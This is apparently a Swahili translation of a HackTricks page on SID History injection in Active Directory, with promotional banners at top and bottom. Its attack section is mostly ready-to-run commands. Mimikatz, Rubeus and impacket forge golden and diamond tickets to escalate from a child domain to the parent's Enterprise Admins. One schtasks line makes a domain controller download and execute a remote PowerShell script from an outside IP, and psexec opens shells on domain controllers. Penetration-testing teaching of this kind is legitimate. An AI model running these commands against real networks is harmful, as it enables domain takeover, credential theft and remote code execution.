# Kuingizwa kwa Historia ya SID

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Shambulio la Kuingiza Historia ya SID

Lengo la **Shambulio la Kuingiza Historia ya SID** ni kusaidia **uhamisho wa mtumiaji kati ya uwanja** huku uhakikisha upatikanaji endelevu wa rasilimali kutoka kwenye uwanja wa awali. Hii inafanikiwa kwa **kuunganisha Kitambulisho cha Usalama (SID) cha awali cha mtumiaji kwenye Historia ya SID** ya akaunti yao mpya. Kwa umuhimu, mchakato huu unaweza kudhibitiwa ili kutoa upatikanaji usiohalali kwa kuongeza SID ya kikundi cha haki kubwa (kama vile Enterprise Admins au Domain Admins) kutoka kwenye uwanja wa mzazi kwenye Historia ya SID. Udanganyifu huu unatoa upatikanaji wa rasilimali zote ndani ya uwanja wa mzazi.

Kuna njia mbili za kutekeleza shambulio hili: kupitia uundaji wa **Tiketi ya Dhahabu** au **Tiketi ya Almasi**.

Ili kubainisha SID ya kikundi cha **"Enterprise Admins"**, kwanza lazima utambue SID ya uwanja wa msingi. Baada ya kutambua hilo, SID ya kikundi cha Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya uwanja wa msingi. Kwa mfano, ikiwa SID ya uwanja wa msingi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayopatikana kwa kikundi cha "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.

Unaweza pia kutumia kikundi cha **Domain Admins**, ambacho kinamalizia na **512**.

Njia nyingine ya kupata SID ya kikundi cha uwanja mwingine (kwa mfano "Domain Admins") ni kwa kutumia:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Tiketi ya Dhahabu (Mimikatz) na KRBTGT-AES256

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

Kwa habari zaidi kuhusu tiketi za dhahabu angalia:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Tiketi ya Almasi (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

Kwa habari zaidi kuhusu tiketi za almasi angalia:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

Pandisha hadi DA ya mizizi au Msimamizi wa Kampuni kwa kutumia KRBTGT hash ya kikoa kilichovamiwa:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

Kwa ruhusa zilizopatikana kutoka kwa shambulio, unaweza kutekeleza kwa mfano shambulio la DCSync katika kikoa kipya:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### Kutoka kwa linux

#### Kwa kutumia [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)

{% code overflow="wrap" %}
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### Kiotomatiki kwa kutumia [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Hii ni script ya Impacket ambayo ita**utomatisha kuongeza hadhi kutoka kwa kikoa cha mtoto hadi kikoa cha mzazi**. Script inahitaji:

* Kikoa cha lengo cha kudhibiti
* Vitambulisho vya mtumiaji wa admin katika kikoa cha mtoto

Mchakato ni:

* Inapata SID kwa kikundi cha Enterprise Admins cha kikoa cha mzazi
* Inapata hash kwa akaunti ya KRBTGT katika kikoa cha mtoto
* Inaunda Golden Ticket
* Ingia kwenye kikoa cha mzazi
* Inapata vitambulisho kwa akaunti ya Administrator katika kikoa cha mzazi
* Ikiwa kubadilisha `target-exec` imeelezewa, inathibitisha kwa Msimamizi wa Kudhibiti wa Kikoa cha kikoa cha mzazi kupitia Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Marejeo
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye repo ya [hacktricks](https://github.com/carlospolop/hacktricks) na [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
